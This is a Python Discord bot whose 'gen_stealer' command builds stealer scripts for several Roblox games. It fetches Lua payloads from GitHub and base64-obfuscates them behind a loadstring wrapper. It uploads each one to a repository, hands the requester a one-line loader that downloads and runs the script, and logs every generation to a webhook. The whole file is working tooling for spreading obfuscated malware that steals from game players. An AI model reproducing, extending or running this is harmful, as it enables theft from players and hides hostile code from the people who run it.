import discord
from discord.ext import commands
from discord import app_commands
import secrets
import os
import requests
import base64
from typing import Optional
from flask import Flask
import threading

BOT_TOKEN = os.getenv('BOT_TOKEN')
GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
GITHUB_REPO = "SharScript/Scripts"
LOGS_WEBHOOK_URL = os.getenv('LOGS_WEBHOOK_URL')

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

app = Flask(__name__)

@app.route('/')
def home():
    return "Discord bot is running!"

class SendFieldValueButton(discord.ui.Button):
    def __init__(self, embed: discord.Embed):
        super().__init__(style=discord.ButtonStyle.primary, label="Copy ✉️")
        self.embed = embed

    async def callback(self, interaction: discord.Interaction):
        try:
            value = self.embed.fields[0].value
            clean_value = (
                value.replace("```lua", "")
                     .replace("```", "")
                     .strip()
            )
            await interaction.response.send_message(clean_value, ephemeral=True)
        except Exception as e:
            print(f"Button error: {str(e)}")
            await interaction.response.send_message("Error Try again!", ephemeral=True)

@tree.command(
    name="gen_stealer",
    description="Set up Stealer"
)
@app_commands.describe(
    username="Username for the stealer",
    game_type="Type of game",
    webhook="Webhook URL (optional)"
)
@app_commands.choices(game_type=[
    app_commands.Choice(name="MM2", value="mm2"),
    app_commands.Choice(name="PS99", value="ps99"),
    app_commands.Choice(name="Adopt Me", value="adopt_me"),
    app_commands.Choice(name="Pls Donate", value="pls_donate"),
])
async def gen_stealer(
    interaction: discord.Interaction,
    username: str,
    game_type: app_commands.Choice[str],
    webhook: Optional[str] = None
):
    await interaction.response.defer(ephemeral=True)
    try:
        if game_type.value == "mm2":
            url = "https://raw.githubusercontent.com/SharScript/MM2/main/Protected_MM2.lua"
            thumbnail_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTxOWYkSasIaeBcOEhcVVxfyFxNpU_MtJDP-w&s"
        elif game_type.value == "ps99":
            url = "https://raw.githubusercontent.com/SharScript/PS99/main/Protected_PS99.lua"
            thumbnail_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRjoGNsO70eNNdGyz0Ka9h-3Q47xDJQodZVKQ&s"
        elif game_type.value == "adopt_me":
            url = "https://raw.githubusercontent.com/SharScript/Adopt-Me/main/Protected_AdoptMe.lua"
            thumbnail_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQvcX0YRA4qPdQhPFiQ-Ev3kwHj9wEg6tbh6aH8WFBYATGx573n46-q2FY&s=10"
        elif game_type.value == "pls_donate":
            url = "https://raw.githubusercontent.com/SharScript/Pls-Donate/main/Protected_PlsDonate.lua"
            thumbnail_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSk5Bt8OFoAF6gWKk_bpKFH35JregoZL-6pw&s"
        else:
            await interaction.followup.send("Invalid game type selected.", ephemeral=True)
            return

        response = requests.get(url)
        if response.status_code != 200:
            await interaction.followup.send("Failed to fetch script. Please try again.", ephemeral=True)
            return

        lua_code = response.text
        filename = f"{secrets.token_hex(12)}.lua"

        with open(filename, "w", encoding="utf-8") as f:
            f.write(lua_code)

        obfuscated = base64.b64encode(lua_code.encode()).decode()
        obfuscated_code = f'local d=function(b)return(load or loadstring)(base64.decode(b))end;local s=[[{obfuscated}]];d(s)()'

        with open(filename, "w", encoding="utf-8") as f:
            f.write(obfuscated_code)

        encoded_content = base64.b64encode(obfuscated_code.encode("utf-8")).decode("utf-8")
        api_url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{filename}"
        commit_message = f"Add obfuscated Lua script for user {username} - game {game_type.name}"

        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github+json"
        }

        response = requests.put(
            api_url,
            json={
                "message": commit_message,
                "content": encoded_content
            },
            headers=headers
        )

        if response.status_code in [200, 201]:
            raw_url = f"https://raw.githubusercontent.com/{GITHUB_REPO}/main/{filename}"
            embed = discord.Embed(
                title="Stealer Script Generated",
                description="This script is generated exclusively for you",
                color=discord.Color.gold()
            )
            embed.add_field(name="Script", value=f'```lua\nloadstring(game:HttpGet("{raw_url}", true))()```', inline=False)
            embed.set_footer(text="Made By Pethical")
            embed.set_thumbnail(url=thumbnail_url)

            view = discord.ui.View()
            view.add_item(SendFieldValueButton(embed))

            await interaction.user.send(embed=embed, view=view)
            await interaction.followup.send(f"Check your DMs, {interaction.user.mention}!", ephemeral=True)

            # Logging webhook
            if LOGS_WEBHOOK_URL:
                log_data = {
                    "embeds": [{
                        "title": "New Stealer Generated",
                        "color": 0xFF0000,
                        "fields": [
                            {"name": "Discord User", "value": f"{interaction.user} (`{interaction.user.id}`)", "inline": False},
                            {"name": "Target Username", "value": username, "inline": True},
                            {"name": "Game", "value": game_type.name, "inline": True},
                            {"name": "Script URL", "value": raw_url, "inline": False}
                        ],
                        "footer": {"text": "Logger by Pethical"}
                    }]
                }
                try:
                    requests.post(LOGS_WEBHOOK_URL, json=log_data)
                except Exception as e:
                    print(f"Failed to send log webhook: {e}")
        else:
            await interaction.followup.send("Failed to upload script. Try again.", ephemeral=True)

    except Exception as e:
        print(f"Error: {e}")
        await interaction.followup.send("An error occurred. Please try again.", ephemeral=True)
    finally:
        if os.path.exists(filename):
            os.remove(filename)

@bot.event
async def on_ready():
    await tree.sync()
    await bot.change_presence(activity=discord.Game(name=".gg/F3bb3e8VBe"))
    print(f"success host {bot.user}")

if not BOT_TOKEN:
    print("Error: BOT_TOKEN not found in environment variables")
    exit(1)

def run_flask():
    app.run(host='0.0.0.0', port=5000)

threading.Thread(target=run_flask).start()
bot.run(BOT_TOKEN)
